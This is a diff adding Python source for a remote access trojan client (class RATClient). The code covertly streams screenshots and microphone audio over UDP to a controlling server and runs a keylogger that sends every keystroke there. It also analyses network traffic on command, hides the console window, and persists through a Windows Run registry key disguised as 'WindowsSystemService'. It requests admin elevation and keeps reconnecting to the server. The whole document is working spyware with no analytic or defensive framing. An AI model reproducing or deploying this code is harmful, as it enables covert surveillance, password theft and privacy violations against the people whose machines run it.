+            adaptive_capture = AdaptiveScreenCapture(self.client_socket)
+            
+            # Initialize sequence tracking
+            frame_number = 0
+            
+            while self.screen_capture_active and self.connected and not self.stop_threads:
+                try:
+                    start_time = time.time()
+                    
+                    # Capture screenshot using PIL
+                    screenshot = ImageGrab.grab()
+                    
+                    # Convert to bytes using OpenCV
+                    screenshot_np = np.array(screenshot)
+                    frame = cv2.cvtColor(screenshot_np, cv2.COLOR_RGB2BGR)
+                    
+                    # Determine quality based on adaptive system
+                    current_quality = adaptive_capture.quality
+                    
+                    # Encode and compress the image
+                    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, current_quality])
+                    compressed_data = zlib.compress(buffer)
+                    
+                    # Calculate number of chunks needed
+                    data_len = len(compressed_data)
+                    num_chunks = (data_len + CHUNK_SIZE - 1) // CHUNK_SIZE
+                    
+                    # Send frame metadata
+                    frame_number += 1
+                    metadata = struct.pack('!QII', data_len, num_chunks, frame_number)
+                    udp_socket.sendto(metadata, self.server_address)
+                    
+                    # Small delay to ensure metadata is processed first
+                    time.sleep(0.002)
+                    
+                    # Send chunks with sequence numbers for reassembly
+                    for i in range(num_chunks):
+                        chunk_start = i * CHUNK_SIZE
+                        chunk_end = min(chunk_start + CHUNK_SIZE, data_len)
+                        chunk = compressed_data[chunk_start:chunk_end]
+                        
+                        # Pack chunk with header (frame_number, chunk_index, total_chunks)
+                        header = struct.pack('!III', frame_number, i, num_chunks)
+                        packet = header + chunk
+                        
+                        # Send the chunk
+                        udp_socket.sendto(packet, self.server_address)
+                        
+                        # Brief pause between chunks to prevent network congestion
+                        if i % 10 == 0 and i > 0:  # Every 10 chunks
+                            time.sleep(0.001)  # 1ms pause to allow processing
+                    
+                    # Calculate total send time
+                    send_time = time.time() - start_time
+                    
+                    # Update adaptive system with performance metrics
+                    adaptive_capture.measure_performance(data_len, send_time)
+                    
+                    # Dynamic sleep based on performance and quality
+                    if send_time < 0.03:  # Very fast sending
+                        sleep_time = max(0.01, (1/30) - send_time)  # Target ~30fps but minimum 10ms
+                    else:
+                        # Calculate based on quality and network conditions
+                        fps_target = max(5, 30 - (current_quality / 5))  # Lower quality = higher FPS
+                        sleep_time = max(0, (1/fps_target) - send_time)
+                    
+                    time.sleep(sleep_time)
+                    
+                    # Print diagnostics occasionally
+                    if frame_number % 30 == 0:
+                        print(f"[*] Frame {frame_number}: {data_len} bytes, {num_chunks} chunks, " 
+                            f"send time: {send_time:.3f}s, quality: {current_quality}, "
+                            f"sleep: {sleep_time:.3f}s")
+                    
+                except Exception as e:
+                    print(f"[!] Error during screen capture: {e}")
+                    time.sleep(1)  # Wait before retry
+            
+            # Send termination signal when done
+            try:
+                udp_socket.sendto(struct.pack('!QII', 0, 0, 0), self.server_address)
+            except:
+                pass
+                
+            udp_socket.close()
+            print("[*] Screen capture stopped")
+        
+        except Exception as e:
+            print(f"[!] Screen capture thread error: {e}")
+            
+    def audio_spy(self):
+        """Capture audio from microphone and send to server via UDP"""
+        print("[*] Starting audio capture")
+        try:
+            # Setup PyAudio
+            p = pyaudio.PyAudio()
+            stream = p.open(format=pyaudio.paInt16,
+                          channels=2,
+                          rate=44100,
+                          input=True)
+            
+            # Create UDP socket for sending audio
+            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            
+            while self.audio_spy_active and self.connected and not self.stop_threads:
+                try:
+                    # Read audio chunk
+                    data = stream.read(4096, exception_on_overflow=False)
+                    packed_size = struct.pack('Q', len(data))
+                    # Send directly via UDP
+                    udp_socket.sendto(packed_size, self.server_address)
+                    udp_socket.sendto(data, self.server_address)
+                    
+                except Exception as e:
+                    print(f"[!] Error during audio capture: {e}")
+                    time.sleep(0.1)  # Small delay before retry
+            
+            # Cleanup
+            stream.stop_stream()
+            stream.close()
+            p.terminate()
+            udp_socket.close()
+            print("[*] Audio capture stopped")
+        
+        except Exception as e:
+            print(f"[!] Audio capture thread error: {e}")
+    
+    def on_key_press(self, key):
+        """Callback for key press events"""
+        if not self.keylogger_active:
+            return False  # Stop listener
+        
+        try:
+            # Convert key to string representation
+            if hasattr(key, 'char'):
+                # Regular character
+                if key.char:
+                    keydata = key.char
+                else:
+                    keydata = '[special]'
+            elif key == keyboard.Key.space:
+                keydata = ' '
+            elif key == keyboard.Key.enter:
+                keydata = '\n'
+            elif key == keyboard.Key.tab:
+                keydata = '\t'
+            elif key == keyboard.Key.backspace:
+                keydata = '⌫'  # Special character for backspace
+            else:
+                # Special key (like shift, ctrl, etc.)
+                keydata = f"[{key}]"
+            
+            # Send key to server
+            if self.connected and self.client_socket:
+                self.client_socket.send(keydata.encode('utf-8', errors='ignore'))
+        
+        except Exception as e:
+            print(f"[!] Error in keylogger: {e}")
+        
+        return True  # Continue listener
+    
+    def start_keylogger(self):
+        """Start the keylogger"""
+        if not self.key_listener:
+            print("[*] Starting keylogger")
+            self.keylogger_active = True
+            
+            # Start keyboard listener in a separate thread
+            self.key_listener = keyboard.Listener(on_press=self.on_key_press)
+            self.key_listener.daemon = True
+            self.key_listener.start()
+    
+    def stop_keylogger(self):
+        """Stop the keylogger"""
+        if self.key_listener:
+            print("[*] Stopping keylogger")
+            self.keylogger_active = False
+            
+            try:
+                self.key_listener.stop()
+                self.key_listener = None
+            except:
+                pass
+
+    def handle_network_analysis_command(self, command):
+        """Handle network analysis commands"""
+        if command == "START_NETWORK_ANALYSIS":
+            self.start_network_analysis()
+        elif command == "STOP_NETWORK_ANALYSIS":
+            self.stop_network_analysis()
+        elif command == "GET_NETWORK_ANALYSIS_DATA":
+            self.send_network_analysis_data()
+
+    def start_network_analysis(self):
+        """Start analyzing network traffic in real-time"""
+        if not hasattr(self, 'network_analyzer'):
+            self.network_analyzer = NetworkAnalyzer()
+            
+        success = self.network_analyzer.start()
+        if success:
+            self.client_socket.send("SUCCESS: Network analysis started".encode())
+        else:
+            self.client_socket.send("ERROR: Failed to start network analysis".encode())
+
+    def stop_network_analysis(self):
+        """Stop network traffic analysis"""
+        if hasattr(self, 'network_analyzer'):
+            self.network_analyzer.stop()
+            
+        self.client_socket.send("SUCCESS: Network analysis stopped".encode())
+
+    def send_network_analysis_data(self):
+        """Send the current network analysis data to the server"""
+        try:
+            if hasattr(self, 'network_analyzer'):
+                # Get latest analysis data
+                analysis_data = self.network_analyzer.get_analysis_data()
+                
+                # Convert to JSON and send
+                data = json.dumps(analysis_data).encode('utf-8')
+                
+                # Send size first
+                self.client_socket.send(struct.pack('Q', len(data)))
+                
+                # Send actual data
+                self.client_socket.sendall(data)
+            else:
+                # Send empty data if analyzer doesn't exist
+                self.client_socket.send(struct.pack('Q', 2))
+                self.client_socket.send("{}".encode())
+                
+        except Exception as e:
+            print(f"[!] Error sending network analysis data: {e}")
+            # Send empty data on error
+            self.client_socket.send(struct.pack('Q', 2))
+            self.client_socket.send("{}".encode())
+
+
+def hide_console():
+    """Hide the console window on Windows"""
+    if os.name == 'nt':  # Only on Windows
+        try:
+            whnd = ctypes.windll.kernel32.GetConsoleWindow()
+            if whnd != 0:
+                ctypes.windll.user32.ShowWindow(whnd, 0)  # SW_HIDE = 0
+        except Exception as e:
+            print(f"[!] Error hiding console: {e}")
+
+def run_on_startup():
+    """Add the client to startup (platform dependent)"""
+    try:
+        if os.name == 'nt':  # Windows
+            # Get the path to the current script
+            script_path = os.path.abspath(sys.argv[0])
+            
+            # Add to registry for startup
+            import winreg
+            key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "WindowsSystemService", 0, winreg.REG_SZ, script_path)
+            winreg.CloseKey(key)
+            
+        print("[*] Added to startup successfully")
+        
+    except Exception as e:
+        print(f"[!] Error adding to startup: {e}")
+
+def is_admin():
+    """Check if the script is running with admin_root privileges"""
+    try:
+        if os.name == 'nt':  # Windows
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except:
+        return False
+
+def main():
+    # Configuration
+    HIDE_CONSOLE = False  # Set to True to hide console window
+    ADD_TO_STARTUP = False  # Set to True to add to startup
+    REQUEST_ADMIN = False  # Set to True to request admin privileges if not already running as admin
+    
+    # Check for admin rights if requested
+    if REQUEST_ADMIN and not is_admin():
+        print("[!] Not running as administrator. Requesting elevation...")
+        try:
+            if os.name == 'nt':  # Windows
+                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+            else:
+                # On Unix systems, we'd typically use sudo, but that requires a password
+                # This is just a placeholder and won't actually work in most cases
+                os.system(f"sudo {sys.executable} {' '.join(sys.argv)}")
+            sys.exit(0)
+        except Exception as e:
+            print(f"[!] Failed to elevate privileges: {e}")
+    
+    # Hide console if requested
+    if HIDE_CONSOLE:
+        hide_console()
+    
+    # Add to startup if requested
+    if ADD_TO_STARTUP:
+        run_on_startup()
+    
+    # Create and run the client
+    client = RATClient(SERVER_IP, SERVER_PORT)
+    
+    # Attempt initial connection
+    connected = client.connect()
+    
+    # Main loop with reconnection attempts
+    while not client.stop_threads:
+        try:
+            if not client.connected:
+                print("[*] Attempting to connect...")
+                client.connect()
+                time.sleep(5)  # Wait before next attempt
+            else:
+                time.sleep(1)  # Just wait while connected
+        except KeyboardInterrupt:
+            print("[*] Keyboard interrupt detected, exiting...")
+            client.disconnect()
+            break
+        except Exception as e:
+            print(f"[!] Error in main loop: {e}")
+            time.sleep(5)
+
+if __name__ == "__main__":
+    main()
